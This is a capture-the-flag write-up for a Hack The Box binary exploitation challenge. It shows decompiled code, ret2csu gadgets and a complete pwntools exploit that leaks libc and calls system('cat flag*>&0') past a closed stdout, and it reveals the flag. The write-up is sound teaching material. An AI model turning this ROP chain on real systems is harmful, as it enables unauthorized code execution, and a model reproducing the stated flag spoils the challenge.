# Case Closed  :closed_lock_with_key:

## Description: 

* Agent, you are investigating a very important case right now. You can search wherever you want for clues. When you are done, please inform me to Close the case for you.

## Objective: 

* Use the *ret2csu* technique to leak the libc base address and call `system("cat flag>&0")` to bypass `fclose(stdout)` and print the flag. 

## Flag: :black_flag:
* `HTB{s0m3t1m3s_u_n33d_t0_0p3n_th3_c4s3_4g41n}`

### Difficulty:
* Medium

## Challenge:

First of all, we start with a `checksec`:  

```gdb
gef➤  checksec
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Full
```

As we can see:

* **Canary** is **disabled**.
* **PIE**  is **disabled**.

That means there might be a possible *Buffer Overflow*.

The interface of the program looks like this:

```console
$ ./case_closed 
Agent, tell me some info about the case you are investigating.
> ok

1. Search for more clues
2. Leave 🏃
> 1
You found nothing of interest..
$ ./case_closed 
Agent, tell me some info about the case you are investigating.
> ok again

1. Search for more clues
2. Leave 🏃
> 2
Have a nice day Agent!
$ ./case_closed 
Agent, tell me some info about the case you are investigating.
> 22

1. Search for more clues
2. Leave 🏃
> 22
You found a secret folder!
Would you like to close the case now Agent?
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaa
Segmentation fault (core dumped)
$ ./case_closed 
Agent, tell me some info about the case you are investigating.
> 22

1. Search for more clues
2. Leave 🏃
> 4
Invalid option! Exiting..
```

As we can see, there is a `SegFault`, confirming that we have a *Buffer Overflow*. In order to get there, we need to choose `22` as an option. This will be clear enough when we start disassembling the binary.

### Disassembly :pick:

Starting from `main()`:

```c
undefined8 main(void)

{
  size_t sVar1;
  int local_80;
  int local_7c;
  char *local_78;
  int local_6c;
  char *local_68;
  int local_5c;
  char *local_58;
  int local_4c;
  char *local_48;
  int local_3c;
  char *local_38;
  int local_2c;
  undefined *local_28;
  int local_1c;
  char *local_18;
  undefined4 local_c;
  
  setup();
  local_c = 0;
  local_18 = "\n1. Search for more clues\n";
  sVar1 = strlen("\n1. Search for more clues\n");
  local_1c = (int)sVar1;
  local_28 = &DAT_00400bdb;
  sVar1 = strlen(&DAT_00400bdb);
  local_2c = (int)sVar1;
  local_38 = "You found nothing of interest..\n";
  sVar1 = strlen("You found nothing of interest..\n");
  local_3c = (int)sVar1;
  local_48 = "Have a nice day Agent!\n";
  sVar1 = strlen("Have a nice day Agent!\n");
  local_4c = (int)sVar1;
  local_58 = "Invalid option! Exiting..\n";
  sVar1 = strlen("Invalid option! Exiting..\n");
  local_5c = (int)sVar1;
  local_68 = "Agent, tell me some info about the case you are investigating.\n> ";
  sVar1 = strlen("Agent, tell me some info about the case you are investigating.\n> ");
  local_6c = (int)sVar1;
  local_78 = "You found a secret folder!\n";
  sVar1 = strlen("You found a secret folder!\n");
  local_7c = (int)sVar1;
  write(1,local_68,(long)local_6c);
  read(0,companion,0xf);
  write(1,local_18,(long)local_1c);
  write(1,local_28,(long)local_2c);
  __isoc99_scanf(&DAT_00400ca6,&local_80);
  if (local_80 == 1) {
    write(1,local_38,(long)local_3c);
  }
  else {
    if (local_80 == 2) {
      write(1,local_48,(long)local_4c);
    }
    else {
      if (local_80 != 0x16) {
        write(1,local_58,(long)local_5c);
                    /* WARNING: Subroutine does not return */
        exit(0x16);
      }
      local_c = 1;
      write(1,local_78,(long)local_7c);
    }
  }
  hidden_func(local_c);
  return 0;
}
```

First thing to notice:

* Not a single `puts()` or `printf()`.

That means, we are going to use the `Ret2csu` technique in order to leak libc base. Apart from that, there is a call to `hidden_func()`.

Taking a close look:

```c
void hidden_func(int param_1)

{
  size_t sVar1;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  int local_28;
  int local_24;
  char *local_20;
  int local_14;
  char *local_10;
  
  if (param_1 == 0) {
                    /* WARNING: Subroutine does not return */
    exit(0x22);
  }
  local_10 = "Would you like to close the case now Agent?\n> ";
  sVar1 = strlen("Would you like to close the case now Agent?\n> ");
  local_14 = (int)sVar1;
  local_20 = "This was a wise choice!\n";
  sVar1 = strlen("This was a wise choice!\n");
  local_24 = (int)sVar1;
  local_28 = 0x464;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  write(1,local_10,(long)local_14);
  read(0,&local_48,(long)local_28);
  write(1,local_20,(long)local_24);
  if (check != 0) {
    fclose(stdout);
    fclose(stderr);
  }
  check = check + 1;
  return;
}
```

#### fclose(stdout) :closed_lock_with_key:

As we can see, there is a *Buffer Overflow* vulnerability because `read()` reads up to 0x464 bytes.

Another interesting thing is:

* There is a `check` value that increments.
* There is an `fclose(stdout)` call.
* It exits if `param1` is not 22.

The major problem here is: `fclose(stdout)`. Why?

Because even if we spawn shell or `cat flag`, we will get no output on the screen! Basic Linux knowledge will allow us to bypass this restriction, if instead of executing `cat flag` we execute `cat flag>&0`. That means it will redirect the input even if `stdout` is closed.

In conclusion:

* **Ret2csu** can be used to leak libc base in order to calculate `system`.
* Store `cat flag>&0` into the global buffer.
* Call `system("cat flag>&0")` in order to get the flag.

### Debugging :bug:

#### Ret2csu

In order to use this technique, we first need to find our gadgets!

```gdb
gef➤  disass __libc_csu_init 
Dump of assembler code for function __libc_csu_init:
   0x0000000000400af0 <+0>:	push   r15
   0x0000000000400af2 <+2>:	push   r14
   0x0000000000400af4 <+4>:	mov    r15,rdx
   0x0000000000400af7 <+7>:	push   r13
   0x0000000000400af9 <+9>:	push   r12
   0x0000000000400afb <+11>:	lea    r12,[rip+0x201296]        # 0x601d98
   0x0000000000400b02 <+18>:	push   rbp
   0x0000000000400b03 <+19>:	lea    rbp,[rip+0x201296]        # 0x601da0
   0x0000000000400b0a <+26>:	push   rbx
   0x0000000000400b0b <+27>:	mov    r13d,edi
   0x0000000000400b0e <+30>:	mov    r14,rsi
   0x0000000000400b11 <+33>:	sub    rbp,r12
   0x0000000000400b14 <+36>:	sub    rsp,0x8
   0x0000000000400b18 <+40>:	sar    rbp,0x3
   0x0000000000400b1c <+44>:	call   0x400630 <_init>
   0x0000000000400b21 <+49>:	test   rbp,rbp
   0x0000000000400b24 <+52>:	je     0x400b46 <__libc_csu_init+86>
   0x0000000000400b26 <+54>:	xor    ebx,ebx
   0x0000000000400b28 <+56>:	nop    DWORD PTR [rax+rax*1+0x0]
   0x0000000000400b30 <+64>:	mov    rdx,r15 # gadget 2
   0x0000000000400b33 <+67>:	mov    rsi,r14
   0x0000000000400b36 <+70>:	mov    edi,r13d
   0x0000000000400b39 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x0000000000400b3d <+77>:	add    rbx,0x1
   0x0000000000400b41 <+81>:	cmp    rbp,rbx
   0x0000000000400b44 <+84>:	jne    0x400b30 <__libc_csu_init+64>
   0x0000000000400b46 <+86>:	add    rsp,0x8
   0x0000000000400b4a <+90>:	pop    rbx # gadget 1
   0x0000000000400b4b <+91>:	pop    rbp
   0x0000000000400b4c <+92>:	pop    r12
   0x0000000000400b4e <+94>:	pop    r13
   0x0000000000400b50 <+96>:	pop    r14
   0x0000000000400b52 <+98>:	pop    r15
   0x0000000000400b54 <+100>:	ret    
End of assembler dump.
```

#### Gadgets :video_game:

As we can see, our gadgets are:

* gadget 1: `0x400b4a`
* gadget 2: `0x400b30`

It is obvious that whatever we put in `pop r14` will be moved to `rsi`. Apart from that we can see that we can also manipulate `rdi` and `rdx` via `r13` and `r15` respectively. Last but not least, we can call whatever is in `r12` (if we zero out the `rbx`).

Our goal is to call: `write(1, write@got, 0x8)` in order to leak `write@got`.
That means that we need to:

- `pop r12` = `write@got`
- `pop r13` = `1`
- `pop r14` = `write@got`
- `pop r15` = `0x8`

Then, we just need to redirect to `hidden_func` in order to trigger another overflow.

Our final payload will look like this:

```python
payload = junk + p64(pop_rdi) + p64(companion)  + p64(ret) + p64(sys) + p64(exit)
```

### Exploit :scroll:

```python
#!/usr/bin/python3
from pwn import *

ip = '172.17.0.1' # change this
port = 1337 # change this
fname = './case_closed' # change this

LOCAL = False

if LOCAL:
	r = process(fname)
	_libc = '/lib/x86_64-linux-gnu/libc.so.6'
	libc = ELF(_libc)
else:
	r = remote(ip, port)
	_libc = './libc.so.6' # change this
	libc = ELF(_libc)

e = ELF(fname)
rop = ROP(e)

rl = lambda : r.recvline()
ru = lambda x : r.recvuntil(x)
inter = lambda : r.interactive()
sla = lambda x,y : r.sendlineafter(x,y)

def name_payload():
	# Payload that will be stored to the buffer.
	sla('>','cat flag*>&0\x00')
	#sla('>', '/bin/sh\x00') # Proof that shell will not work!

def gadgets(g1, g2, write_got, hidden_func): 
	payload = p64(g1) # gadget 1
	payload += p64(0) # pop rbx
	payload += p64(1) # pop rbp
	payload += p64(write_got) # pop r12
	payload += p64(1) # pop r13
	payload += p64(write_got) # pop r14
	payload += p64(0x8) # pop r15
	payload += p64(g2)  # ret (gadget 2)
	payload += p64(0)*7
	payload += p64(hidden_func) 
	return payload

def pwn():
	# Find addresses + gadgets
	g1 = 0x400b4a
	g2 = 0x400b30
	exit = e.symbols['exit']
	write_got = e.got['write']
	write_plt = e.plt['write']
	ret = rop.find_gadget(['ret'])[0]
	write_libc = libc.symbols['write']
	companion = e.symbols['companion']
	hidden_func = e.symbols['hidden_func']
	pop_rdi = rop.find_gadget(['pop rdi'])[0]

	# Store payload and call hidden
	name_payload()
	sla('>', '22')

	# Leak write@got and calculate libc base + system
	junk = b'A'*72
	payload = junk
	payload += gadgets(g1, g2, write_got, hidden_func)
	sla('>', payload)
	leaked = u64(rl()[1:9])
	base = leaked - write_libc
	sys = base + libc.symbols['system']
	
	# Print what we leaked
	print('Leaked: 0x{:x}'.format(leaked))
	print('Base:   0x{:x}'.format(base))
	print('System: 0x{:x}'.format(sys))

	# Send final payload and get flag
	payload = junk + p64(pop_rdi) + p64(companion)  + p64(ret) + p64(sys) + p64(exit)
	sla('>', payload)
	inter()

if __name__ == '__main__':
	pwn()
```



### PoC: :checkered_flag:

```sh
$ ./solver.py 
[+] Opening connection to 172.17.0.1 on port 1337: Done
[*] 'challenge/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] 'challenge/case_closed'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './case_closed'
Leaked: 0x7fe1478a5210
Base:   0x7fe147795000
System: 0x7fe1477e4550
[*] Switching to interactive mode
 HTB{s0m3t1m3s_u_n33d_t0_0p3n_th3_c4s3_4g41n}
[*] Got EOF while reading in interactive
$ id
$ id
[*] Closed connection to 172.17.0.1 port 1337
[*] Got EOF while sending in interactive
```

